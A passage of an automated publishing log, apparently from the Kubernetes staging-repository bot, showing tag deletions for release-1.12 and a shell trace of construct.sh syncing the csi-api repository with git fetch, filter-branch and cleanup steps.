\"4d470d6f7fdec0056c910e3d570485fe6e839894\"\n>\tDeleting tag v1.9.5-beta.0 because kFirstParentCommits lacks target \"d2d943af4fb9b5cefd7781d7fc8a3bf3ed8522fd\"\n>\tDeleting tag v1.3.6 because kFirstParentCommits lacks target \"ae4550cc9c89a593bcda6678df201db1b208133b\"\n>\tDeleting tag v1.5.0-beta.1 because kFirstParentCommits lacks target \"8c6525e891be1c44cbdd6fcf53097a3adb11d68c\"\n>\tDeleting tag v1.6.14-beta.0 because kFirstParentCommits lacks target \"1cd671df0e4ab3465520d16e8839bc6d91edf91d\"\n>\tDeleting tag v1.7.14-beta.0 because kFirstParentCommits lacks target \"9f1741ef9dc5149d518c3518054dc229693a3d6e\"\n>\tDeleting tag v1.8.5-beta.0 because kFirstParentCommits lacks target \"5db1551cf5006d40d86a33b5f0b130875ee424b5\"\n>\tDeleting tag v0.10.0 because kFirstParentCommits lacks target \"71e26cbeb9c0bf1b6cc4c29b1f9d930e53513911\"\n>\tDeleting tag v0.21.3 because tagObject failed: object not found\n>\tDeleting tag v0.20.0 because kFirstParentCommits lacks target \"c17a15a0cbcac20230c6d63a584958422c5fd9ec\"\n>\tDeleting tag v1.1.1-beta because kFirstParentCommits lacks target \"7d6c8b640f2e90cf2347fb46ef4cf46cd3280015\"\n>\tDeleting tag v1.7.0-rc.1 because kFirstParentCommits lacks target \"6b9ded1649cfb512d4e88570c738aca9f8265639\"\n>\tDeleting tag v1.6.4-beta.1 because kFirstParentCommits lacks target \"310c79ee536163e5fa1771bcef0d03f8a517af8c\"\n>\tDeleting tag v1.3.1-beta.0 because kFirstParentCommits lacks target \"a639d02cbff6f21e89eb639c7b7e5ad268bd4c29\"\n>\tDeleting tag v1.3.6-beta.0 because kFirstParentCommits lacks target \"a570a0fef12408f1c0a7214952055bad39c160d7\"\n>\tDeleting tag v1.6.0-beta.4 because kFirstParentCommits lacks target \"b202120be3a97e5f8a5e20da51d0b6f5a1eebd31\"\n>\tDeleting tag v1.7.13 because kFirstParentCommits lacks target \"7e4c2dfb27000d69cd43d3a78ece76d5564687be\"\n>\tDeleting tag v1.7.7-beta.0 because kFirstParentCommits lacks target \"d3faa3f8f2e85c8089e80a661955626ae24abf80\"\n>\tDeleting tag v1.1.1 because kFirstParentCommits lacks target \"92635e23dfafb2ddc828c8ac6c03c7a7205a84d8\"\n>\tDeleting tag v1.8.0 because kFirstParentCommits lacks target \"0b9efaeb34a2fc51ff8e4d34ad9bc6375459c4a4\"\n>\tDeleting tag v1.8.12 because kFirstParentCommits lacks target \"5d26aba6949f188fde1af4875661e038f538f2c6\"\n>\tDeleting tag v1.4.0-beta.5 because kFirstParentCommits lacks target \"90f8457d7887249e0eac7e9f936b70ed40a4f154\"\n>\tDeleting tag v1.4.5-beta.0 because kFirstParentCommits lacks target \"1bed5bb1a72be482ea507da3057b689d5a3034f1\"\n>\tDeleting tag v1.5.3-beta.0 because kFirstParentCommits lacks target \"b5f9d56cab78ccaad2b726223ba8be5802026f0b\"\n>\tDeleting tag v1.7.12-beta.0 because kFirstParentCommits lacks target \"15ea8ac863f13cf2a3496cd056b3d5a763a25c34\"\n>\tDeleting tag v1.11.1-beta.0 because kFirstParentCommits lacks target \"395200531414cf49c0b1d139bcde74ec2c7ded55\"\n>\tDeleting tag v1.2.0-beta.0 because kFirstParentCommits lacks target \"50f7568d7f9b001c90ed75e79d41478afcd64a34\"\n>\tDeleting tag v1.2.5 because kFirstParentCommits lacks target \"25eb53b54e08877d3789455964b3e97bdd3f3bce\"\n>\tDeleting tag v1.8.10 because kFirstParentCommits lacks target \"044cd262c40234014f01b40ed7b9d09adbafe9b1\"\n>\tDeleting tag v1.0.4 because kFirstParentCommits lacks target \"65d28d5fd12345592405714c81cd03b9c41d41d9\"\n>\tDeleting tag v1.4.5 because kFirstParentCommits lacks target \"5a0a696437ad35c133c0c8493f7e9d22b0f9b81b\"\n>\tDeleting tag v1.6.4-beta.0 because kFirstParentCommits lacks target \"1f83569cf3e3ae818893998da9d8d516f19b782c\"\n>\tDeleting tag v1.9.1-beta.0 because kFirstParentCommits lacks target \"3fe50987ca023facad784ca89acd334a32ae87ac\"\n>\tDeleting tag v1.6.12-beta.0 because kFirstParentCommits lacks target \"2f830d21be89a077189f60a2d0b8379b7e2ba533\"\n>\tDeleting tag v1.7.1 because kFirstParentCommits lacks target \"1dc5c66f5dd61da08412a74221ecc79208c2165b\"\n>\tDeleting tag v1.7.17-beta.0 because kFirstParentCommits lacks target \"82c9c69960f9f165234af6a3a1945bccf4bb1124\"\n>\tDeleting tag v1.5.1 because kFirstParentCommits lacks target \"82450d03cb057bab0950214ef122b67c83fb11df\"\n>\tDeleting tag v1.7.11 because kFirstParentCommits lacks target \"b13f2fd682d56eab7a6a2b5a1cab1a3d2c8bdd55\"\n>\tDeleting tag v0.21.2 because kFirstParentCommits lacks target \"4e89f2e6670b1662021a86ac42b99c5c50c37d05\"\n>\tDeleting tag v0.7.0 because kFirstParentCommits lacks target \"ad44234f7152e9c66bc2853575445c7071335e57\"\n>\tDeleting tag v1.11.0-rc.3 because kFirstParentCommits lacks target \"931fc3b3aef9d679436978529fc7065d75352671\"\n>\tDeleting tag v1.3.2 because kFirstParentCommits lacks target \"9bafa3400a77c14ee50782bb05f9efc5c91b3185\"\n>\tDeleting tag v1.8.14-beta.0 because kFirstParentCommits lacks target \"6acdd441b7689ae6cc0b057288f276d459e94f19\"\n>\tDeleting tag v0.15.0 because kFirstParentCommits lacks target \"831f3e60d7cd64c61a775d6c78acce1673dd8aa9\"\n>\tDeleting tag v0.20.1 because kFirstParentCommits lacks target \"b7162294ea69fe4d39f235be5167860cbe68d44c\"\n>\tDeleting tag v1.3.0 because kFirstParentCommits lacks target \"283137936a498aed572ee22af6774b6fb6e9fd94\"\n>\tDeleting tag v1.7.6 because kFirstParentCommits lacks target \"4bc5e7f9a6c25dc4c03d4d656f2cefd21540e28c\"\n>\tDeleting tag v1.3.0-beta.2 because kFirstParentCommits lacks target \"caf9a4d87700ba034a7b39cced19bd5628ca6aa3\"\n>\tDeleting tag v1.4.0-beta.8 because kFirstParentCommits lacks target \"3040f87c570a772ce94349b379f41f329494a4f7\"\n>\tDeleting tag v1.4.12-beta.0 because kFirstParentCommits lacks target \"96287135c3a52e4d21c2a3a783f621c7b92b1609\"\n>\tDeleting tag v0.2 because kFirstParentCommits lacks target \"a0abb3815755d6a77eed2d07bb0aa7d255e4e769\"\n>\tDeleting tag v1.5.7 because kFirstParentCommits lacks target \"8eb75a5810cba92ccad845ca360cf924f2385881\"\n>\tDeleting tag v1.9.8-beta.0 because kFirstParentCommits lacks target \"d6f1fe6de8d33cddabc8314d204cdec8fd3b45b7\"\n>\tDeleting tag v1.1.7-beta.0 because kFirstParentCommits lacks target \"dcab4ce0acca599b1a4413a5b00d4fc09b683476\"\n>\tDeleting tag v1.11.0-beta.2 because kFirstParentCommits lacks target \"be2cfcf9e44b5162a294e977329d6c8194748c4e\"\n>\tDeleting tag v1.6.6-beta.0 because kFirstParentCommits lacks target \"b90e25a03b263752154c68fc3c09ef9921cf1dae\"\n>\tDeleting tag v0.6.1 because kFirstParentCommits lacks target \"6351efc43db8702072bfd31f3e0af9ea444115ac\"\n>\tDeleting tag v1.10.0-beta.1 because kFirstParentCommits lacks target \"37555e6d24c2f951c40660ea59a80fa251982005\"\n>\tDeleting tag v1.2.0-alpha.0 because kFirstParentCommits lacks target \"5c02e7f123a3f5f0b271fb811cf0245a660e9536\"\n>\tDeleting tag v1.4.3 because kFirstParentCommits lacks target \"4957b090e9a4f6a68b4a40375408fdc74a212260\"\n>\tDeleting tag v1.8.15 because kFirstParentCommits lacks target \"c2bd642c70b3629223ea3b7db566a267a1e2d0df\"\n>\tDeleting tag v0.13.1 because kFirstParentCommits lacks target \"aaf75fa121d2db8f230fad0212fcfa5741443f12\"\n>\tDeleting tag v1.10.2-beta.0 because kFirstParentCommits lacks target \"be9ffdb012554083a426a97368d5a7bdd8940c00\"\n>\tDeleting tag v1.4.0-beta.10 because kFirstParentCommits lacks target \"3aa6d31d3a213ba04b3252cc123ddef26d44cd0e\"\n>\tDeleting tag v1.10.8-beta.0 because kFirstParentCommits lacks target \"df3ab68a478d6e4d29c9e257159cce1a07e3c643\"\n>\tDeleting tag v1.9.3 because kFirstParentCommits lacks target \"d2835416544f298c919e2ead3be3d0864b52323b\"\n>\tDeleting tag v1.4.4-beta.0 because kFirstParentCommits lacks target \"77bdb7f343d9feade94c17a2f25fef71cd0a92d7\"\n>\tDeleting tag v1.6.4 because kFirstParentCommits lacks target \"d6f433224538d4f9ca2f7ae19b252e6fcb66a3ae\"\n>\tDeleting tag v1.3.9-beta.0 because kFirstParentCommits lacks target \"02fe987a687cd5803f493f3ef2ef707f525f98fd\"\n>\tDeleting tag v1.6.0-rc.1 because kFirstParentCommits lacks target \"8ea07d1fd277de8ab5ea7f281766760bcb7d0fe5\"\n>\tDeleting tag v1.7.9-beta.0 because kFirstParentCommits lacks target \"9c689e1b30c62d4322fb6d8d71237299dc61349d\"\n>\tDeleting tag v1.4.0-beta.2 because kFirstParentCommits lacks target \"9c9daa389e30e762fbbd46d68226fedc890149f9\"\n>\tDeleting tag v1.6.11 because kFirstParentCommits lacks target \"398c13def6f08d6476f686e6b01ea810f7d4ead5\"\n>\tDeleting tag v1.10.0-beta.4 because kFirstParentCommits lacks target \"a2dacb6f846e9d64d02c5dc5ab3972287d337405\"\n>\tDeleting tag v1.6.3 because kFirstParentCommits lacks target \"0480917b552be33e2dba47386e51decb1a211df6\"\n>\tDeleting tag v1.3.9 because kFirstParentCommits lacks target \"ee10669e21109f86c21e8f7ceb1187d7910fe120\"\n>\tDeleting tag v1.4.7-beta.0 because kFirstParentCommits lacks target \"fd8fac83034df346529c6e11aabceea2db48d663\"\n>\tDeleting tag v1.6.10 because kFirstParentCommits lacks target \"6c7eb1f61f963295b53a1d86f488ec1a54da7523\"\n>\tDeleting tag v1.8.11-beta.0 because kFirstParentCommits lacks target \"8c5b6bee50b4f107f053b3e4ad3f0a8b705bfcd0\"\n>\tDeleting tag v0.5.3 because kFirstParentCommits lacks target \"6c3131404997a52d60b9af891ebf9badcc9f5e8f\"\n>\tDeleting tag v1.11.0-rc.2 because kFirstParentCommits lacks target \"d0a17cb4bbdf608559f257a76acfaa9acb054903\"\n>\tDeleting tag v0.14.2 because kFirstParentCommits lacks target \"3ffb6193b5152fc3a2e2a4a12111130f4b531110\"\n>\tDeleting tag v1.1.9-beta.0 because kFirstParentCommits lacks target \"596055084fbaef446983b14097f832f60ae57634\"\n>\tDeleting tag v1.6.1-beta.0 because kFirstParentCommits lacks target \"8d26223577ea3c9ad94c6e858a6ec43ef8927a9c\"\n>\tDeleting tag v1.3.11-beta.0 because kFirstParentCommits lacks target \"759dd0dfb826658c78db42d97b77b9594cd43333\"\n>\tDeleting tag v0.20.2 because kFirstParentCommits lacks target \"323fde5bc5c45e30bbb5451ccf5c1ff01b0717f7\"\n>\tDeleting tag v1.4.0-alpha.0 because kFirstParentCommits lacks target \"fd1377a16b5e2e33f24a57848071616c81a7f58f\"\n>\tDeleting tag v1.9.6 because kFirstParentCommits lacks target \"9f8ebd171479bec0ada837d7ee641dec2f8c6dd1\"\n>\tDeleting tag v1.7.16 because kFirstParentCommits lacks target \"e8846c1d7e7e632d4bd5ed46160eff3dc4c993c5\"\n>\tDeleting tag v0.4.4 because kFirstParentCommits lacks target \"efd443bcd6f005566daa85da0a5f0b633b40d4e3\"\n>\tDeleting tag v0.5.5 because kFirstParentCommits lacks target \"4cb55b015bf1f42a9da25dbf4c3f4a60a1959574\"\n>\tDeleting tag v1.10.3-beta.0 because kFirstParentCommits lacks target \"eaf573aa2b03b2a0c939b341007ca19fcb4685a8\"\n>\tDeleting tag v0.7.3 because kFirstParentCommits lacks target \"c7bf0b19999feb3f326151aa88def9bbc0a865c8\"\n>\tDeleting tag v1.7.11-beta.0 because kFirstParentCommits lacks target \"3639f375633d581271e91783b4592d455bd29aeb\"\n>\tDeleting tag v1.3.7 because kFirstParentCommits lacks target \"a2cba278cba1f6881bb0a7704d9cac6fca6ed435\"\n>\tDeleting tag v1.9.10 because kFirstParentCommits lacks target \"098570796b32895c38a9a1c9286425fb1ececa18\"\n>\tDeleting tag v1.10.0 because kFirstParentCommits lacks target \"fc32d2f3698e36b93322a3465f63a14e9f0eaead\"\n>\tDeleting tag v1.11.2-beta.0 because kFirstParentCommits lacks target \"9ead5ada0d797d4b5237d274644d0a09ebfc0b93\"\n>\tDeleting tag v1.7.1-beta.0 because kFirstParentCommits lacks target \"ebb8d6e0fadfc95f3d64ccecc36c8ed2ac9224ef\"\n>\tDeleting tag v1.8.13-beta.0 because kFirstParentCommits lacks target \"ffb25adb59532f9ea99d5e2996274db07ea46d32\"\n>\tDeleting tag v1.8.8 because kFirstParentCommits lacks target \"2f73858c9e6ede659d6828fe5a1862a48034a0fd\"\n>\tDeleting tag v1.9.1 because kFirstParentCommits lacks target \"3a1c9449a956b6026f075fa3134ff92f7d55f812\"\n>\tDeleting tag v1.0.2 because kFirstParentCommits lacks target \"e310e619fc1ac4f3238bf5ebe9e7033bf5d47ee2\"\n>\tDeleting tag v1.10.6 because kFirstParentCommits lacks target \"a21fdbd78dde8f5447f5f6c331f7eb6f80bd684e\"\n>\tDeleting tag v1.5.4-beta.0 because kFirstParentCommits lacks target \"e9eeec655e7fdee50d4e19200f9707d1cd4a3371\"\n>\tDeleting tag v1.7.8-beta.0 because kFirstParentCommits lacks target \"583f0e200c8440b5e2bf3d988d9b5e772f91370e\"\n>\tDeleting tag v1.0.8-beta because kFirstParentCommits lacks target \"6234d6a0abd3323cd08c52602e4a91e47fc9491c\"\n>\tDeleting tag v1.6.0-beta.1 because kFirstParentCommits lacks target \"23cded36d1d20a538f97e0da05c1d2b62a6be700\"\n>\tDeleting tag v1.7.2-beta.0 because kFirstParentCommits lacks target \"aa6ec59679c9041a772912788a550adca0d0996c\"\n>\tDeleting tag v1.3.3 because kFirstParentCommits lacks target \"c6411395e09da356c608896d3d9725acab821418\"\n>\tDeleting tag v1.6.0-beta.3 because kFirstParentCommits lacks target \"0cd5ed469508e6dfc807ee6681561c845828917e\"\n>\tDeleting tag v1.7.5 because kFirstParentCommits lacks target \"17d7182a7ccbb167074be7a87f0a68bd00d58d97\"\n>\tDeleting tag v1.9.6-beta.0 because kFirstParentCommits lacks target \"d7a2edd326432dc3e8ffa876cc3034d143f7bcae\"\n>\tDeleting tag v0.5 because kFirstParentCommits lacks target \"e2e1c87ae06b303af92fdb5f44af60643d80469e\"\n>\tDeleting tag v0.7.4 because kFirstParentCommits lacks target \"b86c729de2ee66242a38730c7f0910db7aa7bab8\"\n>\tDeleting tag v1.8.10-beta.0 because kFirstParentCommits lacks target \"bde6c18fee950ac8b40320e2106b38f5cf70370f\"\n>\tDeleting tag v0.6.2 because kFirstParentCommits lacks target \"729fde276613eedcd99ecf5b93f095b8deb64eb4\"\n>\tDeleting tag v1.5.5 because kFirstParentCommits lacks target \"894ff23729bbc0055907dd3a496afb725396adda\"\n>\tDeleting tag v1.3.3-beta.0 because kFirstParentCommits lacks target \"b983cc0fcfeb337157038b418bbc37774af1df94\"\n>\tDeleting tag v1.4.4 because kFirstParentCommits lacks target \"3b417cc4ccd1b8f38ff9ec96bb50a81ca0ea9d56\"\n>\tDeleting tag v1.7.9 because kFirstParentCommits lacks target \"7f63532e4ff4fbc7cacd96f6a95b50a49a2dc41b\"\n>\tDeleting tag v1.1.5-beta.0 because kFirstParentCommits lacks target \"e8fdbb77ef7d92b519b15d357fd3bfac55e01e01\"\n>\tDeleting tag v1.10.1 because kFirstParentCommits lacks target \"d4ab47518836c750f9949b9e0d387f20fb92260b\"\n>\tDeleting tag v1.10.5 because kFirstParentCommits lacks target \"32ac1c9073b132b8ba18aa830f46b77dcceb0723\"\n>\tSkipping tag v1.12.0-rc.1 because bTagCommits has \"kubernetes-1.12.0-rc.1\"\n>\tSkipping tag v1.10.0-alpha.3 because bTagCommits has \"kubernetes-1.10.0-alpha.3\"\n>\tSkipping tag v1.12.0-beta.2 because bTagCommits has \"kubernetes-1.12.0-beta.2\"\n>\tSkipping tag v1.11.0-alpha.2 because bTagCommits has \"kubernetes-1.11.0-alpha.2\"\n>\tSkipping tag v1.12.0-alpha.0 because bTagCommits has \"kubernetes-1.12.0-alpha.0\"\n>\tSkipping tag v1.9.0-alpha.2 because bTagCommits has \"kubernetes-1.9.0-alpha.2\"\n>\tSkipping tag v1.12.0-beta.0 because bTagCommits has \"kubernetes-1.12.0-beta.0\"\n>\tSkipping tag v1.10.0-alpha.0 because bTagCommits has \"kubernetes-1.10.0-alpha.0\"\n>\tSkipping tag v1.10.0-alpha.2 because bTagCommits has \"kubernetes-1.10.0-alpha.2\"\n>\tSkipping tag v1.11.0-alpha.0 because bTagCommits has \"kubernetes-1.11.0-alpha.0\"\n>\tSkipping tag v1.12.0-alpha.1 because bTagCommits has \"kubernetes-1.12.0-alpha.1\"\n>\tSkipping tag v1.9.0-alpha.0 because bTagCommits has \"kubernetes-1.9.0-alpha.0\"\n>\tSkipping tag v1.9.0-alpha.3 because bTagCommits has \"kubernetes-1.9.0-alpha.3\"\n>\tSkipping tag v1.12.0-beta.1 because bTagCommits has \"kubernetes-1.12.0-beta.1\"\n>\tSkipping tag v1.10.0-alpha.1 because bTagCommits has \"kubernetes-1.10.0-alpha.1\"\n>\tSkipping tag v1.11.0-alpha.1 because bTagCommits has \"kubernetes-1.11.0-alpha.1\"\n>\tSkipping tag v1.13.0-alpha.0 because bTagCommits has \"kubernetes-1.13.0-alpha.0\"\n>\tSkipping tag v1.9.0-alpha.1 because bTagCommits has \"kubernetes-1.9.0-alpha.1\"\n>\t++ git rev-parse release-1.12\n>\t+ '[' fe7a8b2adc43be56b3adb01230644874bdde47f4 '!=' fe7a8b2adc43be56b3adb01230644874bdde47f4 ']'\n>\t+ git checkout release-1.12\n>\tYour branch is up-to-date with 'origin/release-1.12'.\n>\tAlready on 'release-1.12'\n>[19 Sep 18 10:12 UTC]: Successfully constructed release-1.12\n>[19 Sep 18 10:12 UTC]: Successfully ensured /go-workspace/src/k8s.io/csi-api exists\n>[19 Sep 18 10:12 UTC]: /bin/bash -c \"git tag | xargs git tag -d >/dev/null\"\n>[19 Sep 18 10:12 UTC]: /publish_scripts/construct.sh csi-api master master apimachinery:master,api:master,client-go:master  /go-workspace/src/k8s.io/kubernetes/.git staging/src/k8s.io/csi-api kubernetes kubernetes k8s.io true \"BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml\"  400981797e38bee5c1b84f7a1f3914db7b74f196\n>\t+ '[' '!' 14 -eq 14 ']'\n>\t+ REPO=csi-api\n>\t+ SRC_BRANCH=master\n>\t+ DST_BRANCH=master\n>\t+ DEPS=apimachinery:master,api:master,client-go:master\n>\t+ REQUIRED=\n>\t+ SOURCE_REMOTE=/go-workspace/src/k8s.io/kubernetes/.git\n>\t+ SUBDIR=staging/src/k8s.io/csi-api\n>\t+ SOURCE_REPO_ORG=kubernetes\n>\t+ SOURCE_REPO_NAME=kubernetes\n>\t+ shift 9\n>\t+ BASE_PACKAGE=k8s.io\n>\t+ IS_LIBRARY=true\n>\t+ RECURSIVE_DELETE_PATTERN='BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ SKIP_TAGS=\n>\t+ LAST_PUBLISHED_UPSTREAM_HASH=400981797e38bee5c1b84f7a1f3914db7b74f196\n>\t+ readonly REPO SRC_BRANCH DST_BRANCH DEPS REQUIRED SOURCE_REMOTE SOURCE_REPO_ORG SUBDIR SOURCE_REPO_NAME BASE_PACKAGE IS_LIBRARY RECURSIVE_DELETE_PATTERN SKIP_TAGS LAST_PUBLISHED_UPSTREAM_HASH\n>\t++ dirname /publish_scripts/construct.sh\n>\t+ SCRIPT_DIR=/publish_scripts\n>\t+ source /publish_scripts/util.sh\n>\t++ set -o errexit\n>\t++ set -o nounset\n>\t++ set -o pipefail\n>\t++ set -o xtrace\n>\tRunning garbage collection.\n>\t+ echo 'Running garbage collection.'\n>\t+ git gc --auto\n>\tFetching from origin.\n>\t+ echo 'Fetching from origin.'\n>\t+ git fetch origin --no-tags --prune\n>\tCleaning up checkout.\n>\t+ echo 'Cleaning up checkout.'\n>\t+ git rebase --abort\n>\tNo rebase in progress?\n>\t+ true\n>\t+ git reset -q --hard\n>\t+ git clean -q -f -f -d\n>\t++ git rev-parse HEAD\n>\t+ git checkout -q 98034ca4f8e262c9587a60b916f73821af1f5e62\n>\t+ git branch -D master\n>\t+ git remote set-head origin -d\n>\t+ git rev-parse origin/master\n>\tSwitching to origin/master.\n>\t+ echo 'Switching to origin/master.'\n>\t+ git branch -f master origin/master\n>\t+ git checkout -q master\n>\t+ echo 'Fetching upstream changes.'\n>\tFetching upstream changes.\n>\t+ git remote\n>\t+ grep -w -q upstream\n>\t+ git remote set-url upstream /go-workspace/src/k8s.io/kubernetes/.git\n>\t+ git fetch -q upstream --no-tags --prune\n>\t++ git rev-parse upstream/master\n>\t+ UPSTREAM_HASH=9228bec334fbda3fa201ea5fb3515f9c0781c82d\n>\t+ '[' 9228bec334fbda3fa201ea5fb3515f9c0781c82d '!=' 400981797e38bee5c1b84f7a1f3914db7b74f196 ']'\n>\t+ echo 'Upstream branch upstream/master moved from '\\''400981797e38bee5c1b84f7a1f3914db7b74f196'\\'' to '\\''9228bec334fbda3fa201ea5fb3515f9c0781c82d'\\''. We have to sync.'\n>\tUpstream branch upstream/master moved from '400981797e38bee5c1b84f7a1f3914db7b74f196' to '9228bec334fbda3fa201ea5fb3515f9c0781c82d'. We have to sync.\n>\t+ sync_repo kubernetes kubernetes staging/src/k8s.io/csi-api master master apimachinery:master,api:master,client-go:master '' k8s.io true 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local source_repo_org=kubernetes\n>\t+ local source_repo_name=kubernetes\n>\t+ local subdirectory=staging/src/k8s.io/csi-api\n>\t+ local src_branch=master\n>\t+ local dst_branch=master\n>\t+ local deps=apimachinery:master,api:master,client-go:master\n>\t+ local required_packages=\n>\t+ local base_package=k8s.io\n>\t+ local is_library=true\n>\t+ shift 9\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ readonly subdirectory src_branch dst_branch deps is_library\n>\t+ local new_branch=false\n>\t+ local orphan=false\n>\t+ git rev-parse -q --verify HEAD\n>\t2966180a4e54fab57c98153a33cf018cc4017ba3\n>\t++ ls -1\n>\t++ wc -l\n>\t+ '[' 10 = 0 ']'\n>\t++ git rev-parse HEAD\n>\tStarting at existing master commit 2966180a4e54fab57c98153a33cf018cc4017ba3.\n>\t+ echo 'Starting at existing master commit 2966180a4e54fab57c98153a33cf018cc4017ba3.'\n>\t+ git branch -D filtered-branch\n>\t+ git branch -f upstream-branch upstream/master\n>\tBranch upstream-branch set up to track remote branch master from upstream.\n>\t++ git rev-parse upstream-branch\n>\tChecked out source commit 9228bec334fbda3fa201ea5fb3515f9c0781c82d.\n>\t+ echo 'Checked out source commit 9228bec334fbda3fa201ea5fb3515f9c0781c82d.'\n>\t+ git checkout -q upstream-branch -b filtered-branch\n>\t+ git reset -q --hard upstream-branch\n>\t+ local f_mainline_commits=\n>\t+ '[' false = true ']'\n>\t+ '[' false = true ']'\n>\t++ last-kube-commit Kubernetes-commit master\n>\t++ local commit_msg_tag=Kubernetes-commit\n>\t++ git log --format=%B master\n>\t++ grep '^Kubernetes-commit: '\n>\t++ sed 's/^Kubernetes-commit: //g'\n>\t++ head -n 1\n>\t+ local k_base_commit=f26556cc14e2a01a1904805566e082484c1f33f9\n>\t+ '[' -z f26556cc14e2a01a1904805566e082484c1f33f9 ']'\n>\t++ git-find-merge f26556cc14e2a01a1904805566e082484c1f33f9 upstream/master\n>\t++ tail -1\n>\t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>\t+++ git rev-list 'f26556cc14e2a01a1904805566e082484c1f33f9^1..upstream/master' --first-parent\n>\t+++ git rev-list f26556cc14e2a01a1904805566e082484c1f33f9..upstream/master --ancestry-path\n>\t+++ git rev-parse f26556cc14e2a01a1904805566e082484c1f33f9\n>\t+ local k_base_merge=f26556cc14e2a01a1904805566e082484c1f33f9\n>\t+ '[' -z f26556cc14e2a01a1904805566e082484c1f33f9 ']'\n>\t+ git branch -f filtered-branch-base f26556cc14e2a01a1904805566e082484c1f33f9\n>\t+ echo 'Rewriting upstream branch master to only include commits for staging/src/k8s.io/csi-api.'\n>\t+ filter-branch Kubernetes-commit staging/src/k8s.io/csi-api 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' filtered-branch filtered-branch-base\n>\tRewriting upstream branch master to only include commits for staging/src/k8s.io/csi-api.\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ local subdirectory=staging/src/k8s.io/csi-api\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ echo 'Running git filter-branch ...'\n>\tRunning git filter-branch ...\n>\t+ local index_filter=\n>\t+ '[' -n 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ patterns=()\n>\t+ local patterns\n>\t+ local p=\n>\t+ index_filter='git rm -q --cached --ignore-unmatch -r'\n>\t+ IFS=' '\n>\t+ read -ra patterns\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''BUILD'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''*/BUILD'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''BUILD.bazel'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''*/BUILD.bazel'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''Gopkg.toml'\\'''\n>\t+ git filter-branch -f --index-filter 'git rm -q --cached --ignore-unmatch -r '\\''BUILD'\\'' '\\''*/BUILD'\\'' '\\''BUILD.bazel'\\'' '\\''*/BUILD.bazel'\\'' '\\''Gopkg.toml'\\''' --msg-filter 'awk 1 && echo && echo \"Kubernetes-commit: ${GIT_COMMIT}\"' --subdirectory-filter staging/src/k8s.io/csi-api -- filtered-branch filtered-branch-base\n>\t++ git rev-parse filtered-branch-base\n>\t+ local f_base_commit=bb43bf9865caef91f64f123f91eb7b66501b59eb\n>\t++ git log --first-parent --format=%H --reverse bb43bf9865caef91f64f123f91eb7b66501b59eb..HEAD\n>\tChecking out branch master.\n>\t+ f_mainline_commits=28b44cb2f1d69864321e9c098c43a72ca2321a38\n>\t+ echo 'Checking out branch master.'\n>\t+ git checkout -q master\n>\t+ '[' -f kubernetes-sha ']'\n>\t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ local split_recursive_delete_pattern\n>\t+ read -r -a split_recursive_delete_pattern\n>\t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>\t+ git add -u\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t++ git rev-parse HEAD\n>\t+ local dst_old_head=2966180a4e54fab57c98153a33cf018cc4017ba3\n>\t+ local k_pending_merge_commit=\n>\t+ local dst_needs_godeps_update=false\n>\t++ git rev-parse HEAD\n>\t+ local dst_merge_point_commit=2966180a4e54fab57c98153a33cf018cc4017ba3\n>\t+ for f_mainline_commit in '${f_mainline_commits}' FLUSH_PENDING_MERGE_COMMIT\n>\t+ local k_mainline_commit=\n>\t+ local k_new_pending_merge_commit=\n>\t+ '[' 28b44cb2f1d69864321e9c098c43a72ca2321a38 = FLUSH_PENDING_MERGE_COMMIT ']'\n>\t++ kube-commit Kubernetes-commit 28b44cb2f1d69864321e9c098c43a72ca2321a38\n>\t++ local commit_msg_tag=Kubernetes-commit\n>\t++ commit-message 28b44cb2f1d69864321e9c098c43a72ca2321a38\n>\t++ git show --format=%B -q 28b44cb2f1d69864321e9c098c43a72ca2321a38\n>\t++ grep '^Kubernetes-commit: '\n>\t++ sed 's/^Kubernetes-commit: //g'\n>\t+ k_mainline_commit=4ff1e32974f8434c9eaab18e76eae455956f1d48\n>\t++ git-find-merge 4ff1e32974f8434c9eaab18e76eae455956f1d48 upstream-branch\n>\t++ tail -1\n>\t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>\t+++ git rev-list '4ff1e32974f8434c9eaab18e76eae455956f1d48^1..upstream-branch' --first-parent\n>\t+++ git rev-list 4ff1e32974f8434c9eaab18e76eae455956f1d48..upstream-branch --ancestry-path\n>\t+++ git rev-parse 4ff1e32974f8434c9eaab18e76eae455956f1d48\n>\t+ k_new_pending_merge_commit=9228bec334fbda3fa201ea5fb3515f9c0781c82d\n>\t+ '[' 9228bec334fbda3fa201ea5fb3515f9c0781c82d = 4ff1e32974f8434c9eaab18e76eae455956f1d48 ']'\n>\t+ '[' master '!=' master ']'\n>\t+ '[' -n '' ']'\n>\t+ k_pending_merge_commit=9228bec334fbda3fa201ea5fb3515f9c0781c82d\n>\t+ '[' 28b44cb2f1d69864321e9c098c43a72ca2321a38 = FLUSH_PENDING_MERGE_COMMIT ']'\n>\t+ '[' master '!=' 